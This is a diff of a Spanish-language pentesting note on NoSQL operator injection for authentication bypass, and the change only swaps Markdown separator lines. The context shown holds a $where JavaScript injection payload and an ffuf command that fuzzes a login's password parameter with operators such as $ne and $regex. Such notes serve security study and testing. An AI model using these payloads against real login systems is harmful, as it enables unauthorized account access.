@@ -17,7 +17,7 @@ linked:
 ---
 # NoSQLi - Operadores (Auth Bypass)
 
-***
+---
 
 ## Cheatsheet
 
@@ -33,7 +33,7 @@ linked:
 | **$where con JS** | `{"$where":"this.user=='admin'"}` | `$where=this.user=='admin'` | Solo si `$where` no bloqueado. Ver [[NoSQLi - JavaScript]]. |
 ^nosqli-operators
 
-___
+---
 
 ## Overview
 
@@ -123,4 +123,4 @@ ffuf -w operators.txt -u "http://target/login?user=admin&pass[FUZZ]=x" -fc 401
 
 Donde `operators.txt` contiene `$ne`, `$gt`, `$regex`, `$in`, etc.
 
-***
+---
